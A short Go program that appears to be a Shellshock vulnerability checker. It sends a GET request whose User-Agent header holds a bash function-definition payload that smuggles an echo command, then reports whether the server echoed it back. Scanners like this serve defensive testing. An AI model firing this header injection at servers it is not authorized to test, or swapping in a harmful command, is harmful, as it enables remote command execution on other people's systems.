package main

import (
	"fmt"
	"os"
	"net/http"
)

func main () {
	// check that the user supplied a url
	if len(os.Args) < 2 {
		return
	}

	url := os.Args[1]

	client := &http.Client{}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return
	}

	req.Header.Set("User-Agent", "() { :;}; echo \"Warning: Server Vulnerable\"")

	resp, err := client.Do(req)
	if err != nil {
		return
	}

	if resp.Header["Warning"] != nil && resp.Header["Warning"][0] == "Server Vulnerable" {
		fmt.Println("vulnerable")
	} else {
		fmt.Println("notvulnerable")
	}
}
